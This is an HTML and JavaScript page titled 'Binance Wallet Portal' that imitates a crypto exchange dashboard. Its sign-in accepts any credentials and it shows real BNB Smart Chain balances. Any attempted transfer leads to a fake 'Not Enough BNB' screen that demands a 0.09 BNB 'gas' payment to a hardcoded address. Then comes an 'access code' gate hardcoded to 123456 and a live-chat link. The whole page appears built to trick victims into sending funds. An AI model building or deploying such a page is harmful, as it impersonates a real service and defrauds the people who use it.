<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Binance Wallet Portal</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script>
  <style>
    /* === Global & Dark Mode Styles === */
    body {
      margin: 0; font-family: 'Arial Black', Arial, sans-serif;
      background-color: #0b0e11; color: #f3ba2f;
    }
    .page {
      display: none;
      padding: 20px;
      min-height: 100vh;
    }
    h2 {
      font-weight: 900;
      font-size: 24px;
      margin-bottom: 20px;
      color: #f3ba2f;
    }
    button {
      cursor: pointer;
      font-weight: 900;
      background-color: #f3ba2f;
      color: #000;
      border: none;
      padding: 12px 20px;
      border-radius: 12px;
      transition: background-color 0.3s ease;
      margin-bottom: 12px;
    }
    button:hover {
      background-color: #e0a80a;
    }
    input[type="text"], input[type="number"], select {
      width: 100%;
      padding: 12px;
      margin-bottom: 12px;
      border-radius: 12px;
      border: 1px solid #f3ba2f;
      background-color: #1e2329;
      color: #f3ba2f;
      font-weight: 900;
      font-family: monospace, monospace;
      box-sizing: border-box;
    }
    input::placeholder {
      color: #d1b547;
    }
    .back-btn {
      background-color: #2b3139;
      color: #f3ba2f;
      border: 1px solid #f3ba2f;
    }
    .back-btn:hover {
      background-color: #1e2329;
    }
    .flex-row {
      display: flex;
      gap: 12px;
    }
    .token {
      cursor: pointer;
    }
    .token:hover {
      background-color: #2b3139;
    }
    .loader {
      border: 4px solid #f3ba2f;
      border-top: 4px solid transparent;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      margin: 0 auto 24px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
  </style>
</head>
<body>

<!-- === PAGE 1: Sign In === -->
<div id="page1" class="page">
  <h2>Sign In</h2>
  <input type="text" id="emailInput" placeholder="Email" />
  <input type="password" id="passwordInput" placeholder="Password" />
  <button onclick="signIn()">Sign In</button>
  <div id="signInStatus" style="color: #f3ba2f; font-weight: 900;"></div>
</div>

<!-- === PAGE 2: Authenticating === -->
<div id="page2" class="page">
  <h2>Authenticating...</h2>
  <p>Please wait while we authenticate your account.</p>
</div>

<!-- === PAGE 3: Account ID Confirmation === -->
<div id="page3" class="page">
  <h2>Account ID Confirmation</h2>
  <p>Please confirm your account ID.</p>
  <button onclick="confirmAccountID()">Confirm</button>
</div>

<!-- === PAGE 4: Homepage (Main Dashboard) === -->
<div id="page4" class="page">
  <div style="font-size: 1.5rem; font-weight: bold; margin-bottom: 20px;">Homepage</div>

  <div class="flex-row" style="margin-bottom: 40px;">
    <button id="connectWalletBtn" onclick="showPage('page13')">Connect Wallet</button>
    <div id="connectedWalletDisplayHomepage" style="color: #f3ba2f; font-weight: 900; margin-left: auto;"></div>
  </div>

  <div style="margin-bottom: 24px; font-weight: 900; font-size: 1.2rem; display: flex; justify-content: space-between; align-items: center;">
    <div>Total Assets</div>
    <div id="totalAssetsDisplay" style="color: #f3ba2f;">$0.00</div>
  </div>

  <div class="flex-row" style="margin-bottom: 40px;">
    <button onclick="showPage('page6')" style="font-weight: 900;">Receive</button>
    <button onclick="showPage('page5')" style="font-weight: 900;">Top Up BNB</button>
    <button onclick="showPage('page8')" style="font-weight: 900;">Transfer</button>
  </div>

  <!-- USDT Token Box -->
  <div class="token bg-[#1E2329] rounded-2xl p-4 mb-4 shadow-md text-white flex items-center justify-between" onclick="openTransferPage('USDT')">
    <div class="flex items-center space-x-3">
      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABjElEQVR4nO3ZMUoDQRRG4WuYyM/ANmwArsAJ7AFuwArsAHbAHawCuwAnawC7cU0rA2puvf2uqrZmd5PaZnZtxz8rcuQqzDEYDAaDwWAwGg8FgMBkOypU/1mff4tcqX/fXvsLuYemK1VX5uK+FXKo3F+LOqPMrT3l2z3u+Z0+lfxN7OtVeuUE1hOZR3BzMRzGcznM5zHMB3PZTGdzmcznMZzNcz3M5fys5Y2nvM5nM5zGbJXJ8b2TPt9VzHc3mQ0xLPMbzzGcyTMZzGcznM5zGb5gZ4/Z2k8rfdOb67yS+cn6xwCawCewCewCewCewAfsAB7ADewAnawCewAnawCewAnawAfsAB7ADewAfsAHbAHbAHrAFuwAnawCewCewCewAfsAB7ADewAfsAHbAHbAH7AAPZ9o1kT7gUmv/3p5Ti8AAAAASUVORK5CYII=" alt="USDT Icon" style="width: 40px; height: 40px;" />
      <div>
        <h3 class="text-lg font-bold">Tether (USDT)</h3>
        <p class="text-sm text-gray-400">BEP-20</p>
      </div>
    </div>
    <div class="text-right">
      <p id="usdtBalance" class="text-yellow-400 font-semibold">0.00</p>
      <p class="text-sm text-gray-400">Balance</p>
    </div>
  </div>

  <!-- BNB Token Box -->
  <div class="token bg-[#1E2329] rounded-2xl p-4 mb-4 shadow-md text-white flex items-center justify-between" onclick="openTransferPage('BNB')">
    <div class="flex items-center space-x-3">
      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABVUlEQVR4nO3Z0UoDQRCG4Qe6A3sAt2DewAXsAt2APfQAbcAd7AJ2gN3gAeSBcjcTL0TX4q+uHOc+Ntzxy/HXXmAFgMBgMBgMBgMBk+KoF/o3s6f9XPpXy0kUbwDpyn+61hX9Vwmsfl2knXQdV8q6Cd9bld2Wt/SbAVsmcDkcxnM5zGbJXDZzFcxnM5zGb5gzOfcznMZzGc5lcxXc9nMZzOcznMZzGcznMZzGcznMZ3KrDKTMZzGbJXJ8b2TPt9VzHc3mQ0xLPMbzzGcyTMZzGcznM5zGb5gZ4/Z2k8rfdOb67yS+cn6xwCawCewCewCewCewAfsAB7ADewAnawCewAnawCewAnawAfsAB7ADewAfsAHbAHbAHrAFuwAnawCewCewCewAfsAB7ADewAfsAHbAHbAH7AAP4BCGmv/ra7i6YAAAAASUVORK5CYII=" alt="BNB Icon" style="width: 40px; height: 40px;" />
      <div>
        <h3 class="text-lg font-bold">BNB</h3>
        <p class="text-sm text-gray-400">BNB Smart Chain</p>
      </div>
    </div>
    <div class="text-right">
      <p id="bnbBalance" class="text-yellow-400 font-semibold">0.0000</p>
      <p class="text-sm text-gray-400">Balance</p>
    </div>
  </div>

  <div style="position: fixed; bottom: 20px; right: 20px;">
    <button onclick="showPage('page12')">Settings</button>
  </div>
</div>

<!-- === PAGE 5: Top Up BNB === -->
<div id="page5" class="page">
  <h2>Top Up BNB</h2>
  <p>This is a placeholder page for topping up BNB.</p>
  <button class="back-btn" onclick="showPage('page4')">Back to Homepage</button>
</div>

<!-- === PAGE 6: Scan === -->
<div id="page6" class="page" style="min-height: 100vh;">
  <div class="max-w-md mx-auto bg-[#1E2329] p-6 rounded-2xl shadow-lg" style="margin: auto;">
    <h2 id="scanAction" style="text-align: center; color: #f3ba2f; font-weight: 900; margin-bottom: 20px;">Receive</h2>
    <div style="display: flex; justify-content: center; margin-bottom: 20px;">
      <img src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=200x200" alt="QR Code" style="border-radius: 16px; border: 1px solid #444c5a;" />
    </div>
    <p style="text-align: center; font-family: monospace; font-weight: 900; color: #f3ba2f; margin-bottom: 20px;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</p>

    <input type="text" id="txHash" placeholder="Enter Transaction Hash" />
    <button onclick="submitTransaction()">Confirm Transaction</button>
    <div id="txStatus" style="color: #2ecc71; font-weight: 900; margin-top: 12px;"></div>
    <button class="back-btn" onclick="showPage('page4')">Back</button>
  </div>
</div>

<!-- === PAGE 7: Connect Wallet === -->
<div id="page7" class="page">
  <h2>Connect Your Wallet</h2>
  <button onclick="connectWallet()">Connect Wallet via MetaMask</button>
  <input type="text" id="manualWallet" placeholder="Enter Wallet Address Manually" />
  <button onclick="manualWalletConnect()">Use Manual Wallet</button>
  <div id="walletInfo" style="color: #f3ba2f; font-weight: 900; margin-top: 12px;"></div>
  <button class="back-btn" onclick="showPage('page4')">Back</button>
</div>

<!-- === PAGE 8: Transfer === -->
<div id="page8" class="page">
  <h2>Make a Transfer</h2>
  <input type="text" id="inputWallet" placeholder="Enter Wallet Address" />
  <select id="networkSelect">
    <option value="">Select Network</option>
    <option value="Ethereum">Ethereum</option>
    <option value="Binance Smart Chain">Binance Smart Chain</option>
  </select>
  <input type="number" id="transferAmount" placeholder="Enter Amount" />
  <button onclick="setMaxAmount()">Use Max</button>
  <div style="margin-top: 12px; font-weight: 900; color: #f3ba2f;">
    Gas Fee: <span id="gasFee">0.09490 BNB</span>
  </div>
  <button onclick="goToBNBGasConfirmationPage('page9i')">Confirm</button>
  <button class="back-btn" onclick="showPage('page4')">Return</button>
</div>

<!-- === PAGE 9i: BNB Gas Confirmation === -->
<div id="page9i" class="page">
  <h2>‚ö†Ô∏è Not Enough BNB</h2>
  <p>Top up <strong>0.09 BNB</strong> to continue.</p>
  <div id="bnbAddressSection" style="word-break: break-all; font-weight: 900; margin-bottom: 16px;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</div>
  <button onclick="copyBNBAddress()">üìã Copy Address</button>
  <button onclick="showPage('page9ii')">‚úÖ Confirm BNB Gas Code</button>
  <button class="back-btn" onclick="showPage('page8')">Return</button>
</div>

<!-- === PAGE 9ii: Access Code === -->
<div id="page9ii" class="page">
  <h2>Access Code Required</h2>
  <input type="text" id="accessCodeInput" placeholder="Enter Access Code" />
  <button onclick="validateAccessCode()">Submit Access Code</button>
  <button class="back-btn" onclick="showPage('page8')">Go Back</button>
</div>

<!-- === PAGE 10: Transaction Processing === -->
<div id="page10" class="page">
  <h2>Transaction Processing...</h2>
  <div class="loader"></div>
  <p>Verifying access code...</p>
</div>

<!-- === PAGE 11: Transaction Declined === -->
<div id="page11" class="page">
  <h2 style="color: #e74c3c;">‚ùå Transaction Declined</h2>
  <p>The code entered was incorrect. Please try again.</p>
  <button onclick="showPage('page9ii')">Try Again</button>
  <button class="back-btn" onclick="showPage('page4')">Back to Homepage</button>
</div>

<!-- === PAGE 12: Settings === -->
<div id="page12" class="page" style="background-color: #0b0e11; color: #f0b90b;">
  <h2>Settings</h2>

  <div id="walletDisplay" style="margin-bottom: 15px; font-weight: bold; color: #f0b90b;">No wallet connected</div>
  <button onclick="connectWallet()">Connect Wallet</button><br/>
  <button onclick="disconnectWallet()" style="background-color: #222; color: #f0b90b; border: 1px solid #f0b90b;">Disconnect Wallet</button><br/>
  <button onclick="logout()" style="background-color: #222; color: red; border: 1px solid red;">Logout</button><br/>

  <input type="text" id="manualWallet" placeholder="Enter Wallet Address Manually" style="background-color: #1e1e1e; color: white; padding: 10px; width: 80%; margin: 10px 0; border: 1px solid #f0b90b; border-radius: 8px;" />
  <button onclick="manualWalletConnect()" style="background-color: #444; color: #f0b90b;">Use Manual Wallet</button><br/><br/>

  <button onclick="window.open('https://widget-page.smartsupp.com/widget/3ab3e4c3fcd21f84344cc872db2a35d9e40245a6', '_blank')" style="background-color: #f0b90b; color: #000;">Live Chat</button>

  <div style="position: fixed; bottom: 20px; right: 20px;">
    <button class="back-btn" onclick="showPage('page4')" style="background-color: #444; color: #f0b90b;">Back to Homepage</button>
  </div>
</div>

<!-- === PAGE 13: Connect Wallet === -->
<div id="page13" class="page">
  <h2>Connect Wallet</h2>
  <button onclick="connectWallet()">Connect Wallet via MetaMask</button>
  <input type="text" id="manualWalletInput" placeholder="Enter Wallet Address Manually" />
  <button onclick="manualWalletConnect()">Use Manual Wallet</button>
  <div id="walletConnectionStatus" style="color: #f3ba2f; font-weight: 900; margin-top: 12px;"></div>
  <button class="back-btn" onclick="showPage('page4')">Back to Homepage</button>
</div>

<script>
  // === Show page helper ===
  function showPage(pageId) {
    document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
    const page = document.getElementById(pageId);
    if (page) page.style.display = 'block';
  }

  // === Initial page load: Sign In (page1) ===
  showPage('page1');

  // === Authentication simulation ===
  function signIn() {
    const email = document.getElementById('emailInput').value.trim();
    const password = document.getElementById('passwordInput').value.trim();
    const status = document.getElementById('signInStatus');
    if (!email || !password) {
      status.innerText = "Email and password required.";
      return;
    }
    status.innerText = "";
    showPage('page2');
    setTimeout(() => {
      showPage('page3');
    }, 1500);
  }
  function confirmAccountID() {
    showPage('page4');
    updateBalancesDisplay();
    updateConnectedWalletDisplay();
  }

  // === Wallet Connect functions ===
  async function connectWallet() {
    const statusId = document.getElementById('walletInfo') || document.getElementById('walletConnectionStatus') || document.getElementById('walletDisplay');
    try {
      if (typeof window.ethereum === 'undefined') {
        statusId.innerText = "MetaMask not available";
        return;
      }
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      if (!accounts.length) {
        statusId.innerText = "No wallet accounts found.";
        return;
      }
      const walletAddress = accounts[0];
      localStorage.setItem("connectedWallet", walletAddress);
      statusId.innerText = `Connected Wallet: ${walletAddress}`;
      updateConnectedWalletDisplay();
      updateBalancesDisplay();
      showPage('page4');
    } catch (err) {
      console.error(err);
      statusId.innerText = "Failed to connect wallet.";
    }
  }
  function manualWalletConnect() {
    const manualInput = document.getElementById('manualWallet') || document.getElementById('manualWalletInput');
    const statusId = document.getElementById('walletInfo') || document.getElementById('walletConnectionStatus') || document.getElementById('walletDisplay');
    if (!manualInput) return;
    const manualAddress = manualInput.value.trim();
    if (!manualAddress || !manualAddress.startsWith("0x") || manualAddress.length !== 42) {
      statusId.innerText = "Invalid wallet address.";
      return;
    }
    localStorage.setItem("connectedWallet", manualAddress);
    statusId.innerText = `Manual Wallet Connected: ${manualAddress}`;
    updateConnectedWalletDisplay();
    updateBalancesDisplay();
    showPage('page4');
  }
  function disconnectWallet() {
    localStorage.removeItem("connectedWallet");
    updateConnectedWalletDisplay();
    updateBalancesDisplay();
    alert("Wallet disconnected.");
  }
  function logout() {
    localStorage.clear();
    alert("Logged out.");
    showPage('page1');
  }
  function updateConnectedWalletDisplay() {
    const wallet = localStorage.getItem("connectedWallet");
    const displayElems = [
      document.getElementById('connectedWalletDisplayHomepage'),
      document.getElementById('walletDisplay'),
      document.getElementById('walletInfo'),
      document.getElementById('walletConnectionStatus')
    ];
    displayElems.forEach(elem => {
      if (elem) elem.innerText = wallet ? wallet : '';
    });
  }

  // === Balance Update ===
  async function updateBalancesDisplay() {
    const wallet = localStorage.getItem("connectedWallet");
    if (!wallet) {
      document.getElementById("usdtBalance").innerText = "0.00";
      document.getElementById("bnbBalance").innerText = "0.0000";
      document.getElementById("totalAssetsDisplay").innerText = "$0.00";
      return;
    }
    try {
      const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
      const usdtAbi = [
        "function balanceOf(address owner) view returns (uint256)",
        "function decimals() view returns (uint8)"
      ];
      const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider);
      const balance = await usdtContract.balanceOf(wallet);
      const decimals = await usdtContract.decimals();
      const usdtBalance = (balance / 10 ** decimals).toFixed(2);
      document.getElementById("usdtBalance").innerText = usdtBalance;

      const bnbBalance = await provider.getBalance(wallet);
      const bnbFormatted = ethers.formatEther(bnbBalance);
      document.getElementById("bnbBalance").innerText = parseFloat(bnbFormatted).toFixed(4);

      const usdtValue = parseFloat(usdtBalance) || 0;
      const bnbValue = parseFloat(bnbFormatted) * 240; // example BNB price
      document.getElementById("totalAssetsDisplay").innerText = `$${(usdtValue + bnbValue).toFixed(2)}`;
    } catch (err) {
      console.error("Balance update error:", err);
    }
  }

  // === Page 6: Submit Transaction ===
  async function submitTransaction() {
    const hash = document.getElementById("txHash").value.trim();
    const status = document.getElementById("txStatus");

    if (!hash || !/^0x([A-Fa-f0-9]{64})$/.test(hash)) {
      status.innerText = "Invalid transaction hash.";
      status.style.color = "red";
      return;
    }

    try {
      const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const receipt = await provider.getTransactionReceipt(hash);

      if (!receipt) {
        status.innerText = "Transaction not found. Please wait for confirmation.";
        status.style.color = "orange";
        return;
      }

      status.innerText = "‚úÖ Transaction Confirmed!";
      status.style.color = "limegreen";

      updateBalancesDisplay();

    } catch (err) {
      console.error(err);
      status.innerText = "Error verifying transaction.";
      status.style.color = "red";
    }
  }

  // === Page 8: Transfer Helpers ===
  function setMaxAmount() {
    // For demo, set max to 1000
    document.getElementById("transferAmount").value = 1000;
    document.getElementById("gasFee").innerText = "0.09490 BNB";
  }
  function goToBNBGasConfirmationPage(pageId) {
    // Basic validation
    const walletAddr = document.getElementById("inputWallet").value.trim();
    const network = document.getElementById("networkSelect").value;
    const amount = document.getElementById("transferAmount").value;
    if (!walletAddr || !walletAddr.startsWith("0x") || walletAddr.length !== 42) {
      alert("Invalid recipient wallet address.");
      return;
    }
    if (!network) {
      alert("Please select a network.");
      return;
    }
    if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
      alert("Please enter a valid amount.");
      return;
    }
    showPage(pageId);
  }

  // === Page 9i: Copy BNB Address ===
  function copyBNBAddress() {
    const addr = document.getElementById("bnbAddressSection").innerText;
    navigator.clipboard.writeText(addr).then(() => {
      alert("BNB address copied to clipboard!");
    });
  }

  // === Page 9ii: Validate Access Code ===
  function validateAccessCode() {
    const code = document.getElementById("accessCodeInput").value.trim();
    if (!code) {
      alert("Please enter the access code.");
      return;
    }
    showPage('page10');
    // Simulate processing delay
    setTimeout(() => {
      if (code === "123456") {
        alert("Access code accepted! Proceeding...");
        showPage('page4');
      } else {
        showPage('page11');
      }
    }, 2000);
  }
  
  // === Helper to open transfer pages from tokens ===
  function openTransferPage(token) {
    // For demo, just open page 8 and prefill token (not implemented)
    showPage('page8');
  }
  
// === Page 10: Transaction Processing ===
function showProcessingPage() {
  showPage('page10');
  // Simulate verification delay (e.g., access code verification or tx processing)
  setTimeout(() => {
    // For demo: after 3 seconds, assume success and go to homepage
    showPage('page4');
    alert("Transaction processed successfully!");
    updateBalancesDisplay();
  }, 3000);
}

// === Page 11: Transaction Declined ===
// No specific function needed as it's a static error page with buttons to retry or return to homepage.

// === Page 12: Settings Functions ===
function disconnectWallet() {
  localStorage.removeItem('connectedWallet');
  updateConnectedWalletDisplay();
  updateBalancesDisplay();
  alert("Wallet disconnected.");
}

function logout() {
  localStorage.clear();
  alert("You have been logged out.");
  showPage('page1'); // Redirect to Sign In page
}

function connectWallet() {
  const statusId = document.getElementById('walletDisplay') || document.getElementById('walletConnectionStatus') || document.getElementById('walletInfo');
  if (!statusId) return;
  
  if (typeof window.ethereum === 'undefined') {
    statusId.innerText = "MetaMask not available";
    return;
  }

  const provider = new ethers.BrowserProvider(window.ethereum);
  provider.send("eth_requestAccounts", []).then(accounts => {
    if (!accounts.length) {
      statusId.innerText = "No wallet accounts found.";
      return;
    }
    const walletAddress = accounts[0];
    localStorage.setItem("connectedWallet", walletAddress);
    statusId.innerText = `Connected Wallet: ${walletAddress}`;
    updateConnectedWalletDisplay();
    updateBalancesDisplay();
    showPage('page4');
  }).catch(err => {
    console.error(err);
    statusId.innerText = "Failed to connect wallet.";
  });
}

function manualWalletConnect() {
  const manualInput = document.getElementById('manualWallet') || document.getElementById('manualWalletInput');
  const statusId = document.getElementById('walletDisplay') || document.getElementById('walletConnectionStatus') || document.getElementById('walletInfo');
  if (!manualInput || !statusId) return;

  const manualAddress = manualInput.value.trim();
  if (!manualAddress || !manualAddress.startsWith("0x") || manualAddress.length !== 42) {
    statusId.innerText = "Invalid wallet address.";
    return;
  }
  localStorage.setItem("connectedWallet", manualAddress);
  statusId.innerText = `Manual Wallet Connected: ${manualAddress}`;
  updateConnectedWalletDisplay();
  updateBalancesDisplay();
  showPage('page4');
}

// === Page 13: Connect Wallet ===
// Reuses connectWallet() and manualWalletConnect() from above

// === Utility function: update connected wallet display (used across pages) ===
function updateConnectedWalletDisplay() {
  const wallet = localStorage.getItem("connectedWallet");
  const displayElems = [
    document.getElementById('connectedWalletDisplayHomepage'),
    document.getElementById('walletDisplay'),
    document.getElementById('walletInfo'),
    document.getElementById('walletConnectionStatus')
  ];
  displayElems.forEach(elem => {
    if (elem) elem.innerText = wallet ? wallet : "No wallet connected";
  });
}

// === Utility function: show page by id ===
function showPage(pageId) {
  document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
  const page = document.getElementById(pageId);
  if (page) page.style.display = 'block';
}

// On initial load, show the Sign In page or Homepage if wallet connected
document.addEventListener("DOMContentLoaded", () => {
  if (localStorage.getItem("connectedWallet")) {
    showPage('page4'); // Homepage
    updateConnectedWalletDisplay();
    updateBalancesDisplay();
  } else {
    showPage('page1'); // Sign In
  }
});
</script>
  
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script>
<script>
  // --- Page 1: Sign In ---
  function signIn() {
    const email = document.getElementById("emailInput").value.trim();
    const password = document.getElementById("passwordInput").value.trim();
    const status = document.getElementById("signInStatus");
    if (!email || !password) {
      status.innerText = "Please enter email and password.";
      status.style.color = "red";
      return;
    }
    status.innerText = "Signing in...";
    status.style.color = "#f3ba2f";
    // Simulate login (replace with actual auth)
    setTimeout(() => {
      status.innerText = "";
      showPage('page4'); // go to Homepage after sign in
    }, 1000);
  }

  // --- Page 4: Homepage ---
  function openTransferPage(token) {
    // For demo, just go to Transfer page
    showPage('page8');
    document.getElementById('networkSelect').value = "Binance Smart Chain";
    document.getElementById('inputWallet').value = "";
    document.getElementById('transferAmount').value = "";
    updateGasFee();
  }

  function updateBalancesDisplay() {
    const wallet = localStorage.getItem("connectedWallet");
    if (!wallet) {
      document.getElementById("usdtBalance").innerText = "0.00";
      document.getElementById("bnbBalance").innerText = "0.0000";
      document.getElementById("totalAssetsDisplay").innerText = "$0.00";
      return;
    }
    const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
    const usdtAbi = [
      "function balanceOf(address owner) view returns (uint256)",
      "function decimals() view returns (uint8)"
    ];
    const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, provider);

    Promise.all([
      usdtContract.balanceOf(wallet),
      usdtContract.decimals(),
      provider.getBalance(wallet)
    ]).then(([balance, decimals, bnbBalance]) => {
      const usdtBalance = (balance / 10 ** decimals).toFixed(2);
      const bnbFormatted = ethers.formatEther(bnbBalance);
      document.getElementById("usdtBalance").innerText = usdtBalance;
      document.getElementById("bnbBalance").innerText = parseFloat(bnbFormatted).toFixed(4);
      // Assume BNB price = $240 for total assets estimation
      const total = parseFloat(usdtBalance) + parseFloat(bnbFormatted) * 240;
      document.getElementById("totalAssetsDisplay").innerText = `$${total.toFixed(2)}`;
    }).catch(err => {
      console.error("Error updating balances:", err);
    });
  }

  // --- Page 5 & 6: Top Up BNB and Scan/Receive ---
  async function submitTransaction() {
    const hash = document.getElementById("txHash").value.trim();
    const status = document.getElementById("txStatus");

    if (!hash || !/^0x([A-Fa-f0-9]{64})$/.test(hash)) {
      status.innerText = "Invalid transaction hash.";
      status.style.color = "red";
      return;
    }

    try {
      const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const receipt = await provider.getTransactionReceipt(hash);

      if (!receipt) {
        status.innerText = "Transaction not found. Please wait for confirmation.";
        status.style.color = "orange";
        return;
      }

      status.innerText = "‚úÖ Transaction Confirmed!";
      status.style.color = "limegreen";

      const wallet = localStorage.getItem("connectedWallet");
      if (!wallet) {
        console.warn("No wallet connected.");
        return;
      }

      // Update balances on confirmation
      updateBalancesDisplay();

    } catch (err) {
      console.error(err);
      status.innerText = "Error verifying transaction.";
      status.style.color = "red";
    }
  }

  // --- Page 7, 12, 13: Wallet Connect / Manual Connect ---
  async function connectWallet() {
    const statusElems = [
      document.getElementById('walletInfo'),
      document.getElementById('walletDisplay'),
      document.getElementById('walletConnectionStatus')
    ].filter(Boolean);

    if (typeof window.ethereum === 'undefined') {
      statusElems.forEach(el => el.innerText = "MetaMask not available");
      return;
    }

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      if (!accounts.length) {
        statusElems.forEach(el => el.innerText = "No wallet accounts found.");
        return;
      }
      const walletAddress = accounts[0];
      localStorage.setItem("connectedWallet", walletAddress);
      statusElems.forEach(el => el.innerText = `Connected Wallet: ${walletAddress}`);
      updateConnectedWalletDisplay();
      updateBalancesDisplay();
      showPage('page4');
    } catch (err) {
      console.error(err);
      statusElems.forEach(el => el.innerText = "Failed to connect wallet.");
    }
  }

  function manualWalletConnect() {
    const manualInput = document.getElementById('manualWallet') || document.getElementById('manualWalletInput');
    const statusElems = [
      document.getElementById('walletInfo'),
      document.getElementById('walletDisplay'),
      document.getElementById('walletConnectionStatus')
    ].filter(Boolean);

    if (!manualInput) return;
    const manualAddress = manualInput.value.trim();
    if (!manualAddress || !manualAddress.startsWith("0x") || manualAddress.length !== 42) {
      statusElems.forEach(el => el.innerText = "Invalid wallet address.");
      return;
    }
    localStorage.setItem("connectedWallet", manualAddress);
    statusElems.forEach(el => el.innerText = `Manual Wallet Connected: ${manualAddress}`);
    updateConnectedWalletDisplay();
    updateBalancesDisplay();
    showPage('page4');
  }

  function disconnectWallet() {
    localStorage.removeItem('connectedWallet');
    updateConnectedWalletDisplay();
    updateBalancesDisplay();
    alert("Wallet disconnected.");
  }

  function logout() {
    localStorage.clear();
    alert("You have been logged out.");
    showPage('page1');
  }

  // --- Pages 8 & 9i & 9ii: Transfer & BNB Gas Confirmation & Access Code ---
  function setMaxAmount() {
    const wallet = localStorage.getItem('connectedWallet');
    if (!wallet) {
      alert("Please connect wallet first.");
      return;
    }
    // For demo, set max to 10 BNB (replace with real balance fetching logic)
    document.getElementById('transferAmount').value = "10";
    updateGasFee();
  }

  function updateGasFee() {
    // Gas fee fixed for demo
    document.getElementById('gasFee').innerText = "0.09490 BNB";
  }

  function goToBNBGasConfirmationPage() {
    showPage('page9i');
  }

  function copyBNBAddress() {
    const address = "0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0";
    navigator.clipboard.writeText(address).then(() => {
      alert("BNB address copied to clipboard!");
    });
  }

  function validateAccessCode() {
    const code = document.getElementById('accessCodeInput').value.trim();
    if (code === "123456") { // demo valid code
      showPage('page10');
      showProcessingPage();
    } else {
      showPage('page11');
    }
  }

  // --- Page 10: Processing & helper ---
  function showProcessingPage() {
    showPage('page10');
    setTimeout(() => {
      alert("Transaction processed successfully!");
      showPage('page4');
      updateBalancesDisplay();
    }, 3000);
  }

  // --- Utility Functions ---
  function updateConnectedWalletDisplay() {
    const wallet = localStorage.getItem("connectedWallet");
    [
      document.getElementById('connectedWalletDisplayHomepage'),
      document.getElementById('walletDisplay'),
      document.getElementById('walletInfo'),
      document.getElementById('walletConnectionStatus')
    ].forEach(elem => {
      if (elem) elem.innerText = wallet ? wallet : "No wallet connected";
    });
  }

  function showPage(pageId) {
    document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
    const page = document.getElementById(pageId);
    if (page) page.style.display = 'block';
  }

  // --- Initialization ---
  document.addEventListener("DOMContentLoaded", () => {
    if (localStorage.getItem("connectedWallet")) {
      showPage('page4'); // Homepage
      updateConnectedWalletDisplay();
      updateBalancesDisplay();
    } else {
      showPage('page1'); // Sign In page
    }
  });
</script>

</body>
</html>
